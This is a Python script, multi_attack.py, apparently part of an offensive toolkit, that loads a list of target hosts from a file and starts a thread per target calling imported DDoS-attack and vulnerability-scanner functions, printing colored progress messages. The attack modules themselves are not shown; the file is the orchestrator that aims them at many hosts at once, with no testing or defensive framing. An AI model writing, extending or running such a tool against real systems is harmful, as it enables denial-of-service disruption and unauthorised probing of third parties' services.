# multi_attack.py
import threading
import time
import settings
from modules import ddos, scanner

targets = []

def load_targets(file_path):
    global targets
    try:
        with open(file_path, "r") as f:
            targets = [line.strip() for line in f.readlines() if line.strip()]
        print(f"{settings.COLOR_GREEN}[+] {len(targets)} Targets Loaded!{settings.COLOR_END}")
    except FileNotFoundError:
        print(f"{settings.COLOR_RED}[!] Target file not found!{settings.COLOR_END}")
        exit()

def attack_target(target):
    print(f"{settings.COLOR_YELLOW}[~] Attacking {target}...{settings.COLOR_END}")
    ddos.start_attack(target)
    # Optional: Start vulnerability scan too
    scanner.scan_target(target)

def start_multi_attack(file_path):
    load_targets(file_path)
    threads = []

    for target in targets:
        t = threading.Thread(target=attack_target, args=(target,))
        threads.append(t)
        t.start()
        time.sleep(0.5)  # slight delay to avoid instant overload

    for t in threads:
        t.join()

    print(f"\n{settings.COLOR_GREEN}[✓] All attacks finished!{settings.COLOR_END}")

if __name__ == "__main__":
    target_file = input("Enter path to target list: ")
    start_multi_attack(target_file)
